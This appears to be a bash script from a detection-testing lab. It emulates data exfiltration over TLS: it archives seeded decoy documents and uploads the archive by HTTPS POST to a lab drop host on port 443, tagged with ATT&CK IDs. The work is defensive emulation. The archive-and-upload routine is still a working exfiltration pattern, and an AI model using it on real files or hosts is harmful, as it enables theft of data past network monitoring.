#!/bin/bash
#
# run-https-exfil.sh
# ---------------------------------------------------------------------------
# EDR DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Exfiltration over an encrypted channel: the staged archive is uploaded over
# TLS to a drop endpoint on port 443 (services/control_api.py /upload, its TLS
# listener with a self-signed decoy certificate). Unlike run-http-exfil.sh, a
# network sensor sees only the TLS handshake, the server name and the volume, so
# detection has to come from the process, the destination or the byte count.
#
#   POST staged archive over TLS to a non-C2 drop   Exfiltration Over Asymmetric
#                                                    Encrypted Non-C2 Protocol (T1048.002)
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

HOME_DIR="${HOME:-/home/root}"
DECOY_DIR="${DECOY_DIR:-${HOME_DIR}/decoy-data}"
RESULTS_DIR="${RESULTS_DIR:-${HOME_DIR}/results}"
DROP_HOST="${C2_HOST:-control-api}"
DROP_PORT="${C2_TLS_PORT:-443}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/httpsexfil_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Cymylau :: HTTPS exfil emulation (TLS) :: session=$SESSION"

ARCHIVE="$(find "$RESULTS_DIR" -maxdepth 1 -name 'staged_*.tar.gz' | sort | tail -n1)"
if [ -z "${ARCHIVE:-}" ]; then
    say "no staged archive found — staging decoy documents now"
    mkdir -p "${DECOY_DIR}/documents"
    [ -z "$(ls -A "${DECOY_DIR}/documents" 2>/dev/null)" ] && bash "$(dirname "$0")/seed-decoys.sh"
    ARCHIVE="${RESULTS_DIR}/httpsexfil_payload_${SESSION}.tar.gz"
    st_mark T1560.001 "stage-for-exfil"
    ax T1560.001 "$LAB_NODE" "$ARCHIVE" -- tar -czf "$ARCHIVE" -C "$DECOY_DIR" documents 2>&1 | tee -a "$LOG"
fi
say "using archive: $ARCHIVE ($(wc -c < "$ARCHIVE" 2>/dev/null || echo 0) bytes)"

step "exfiltrate the archive over TLS to the drop endpoint (ATT&CK T1048.002)"
st_mark T1048.002 "https-exfil"
RESP="$(ST_HTTP_TIMEOUT=10 st_http POST "https://${DROP_HOST}:${DROP_PORT}/upload" "@${ARCHIVE}" "Content-Type: application/octet-stream")"
say "drop response: $RESP"
[ -n "$RESP" ] || { say "!! no response from https://${DROP_HOST}:${DROP_PORT} — is control-api's TLS listener up?"; exit 1; }

step "Done — HTTPS exfil complete."
say "artifacts: $LOG  (received copy under results/c2_exfil_received/upload_tls_* on the control-api side)"

act_summary
